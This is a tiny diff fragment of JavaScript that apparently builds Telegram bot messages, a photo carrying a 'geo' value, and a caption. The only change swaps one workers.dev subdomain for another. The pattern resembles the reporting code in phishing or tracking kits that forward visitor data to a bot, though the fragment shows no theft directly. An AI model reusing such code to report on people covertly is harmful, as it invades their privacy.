@@ -183,7 +183,7 @@ B.method = "sendMessage"
             })
             B.photo = "https://res.cloudinary.com/o6/" + X.geo
             B.method = "sendPhoto"
-            B.caption = "s0s.1i.workers.dev"
+            B.caption = "ovca.8c.workers.dev"
             B.reply_markup = {
                 inline_keyboard: [
                     [ {
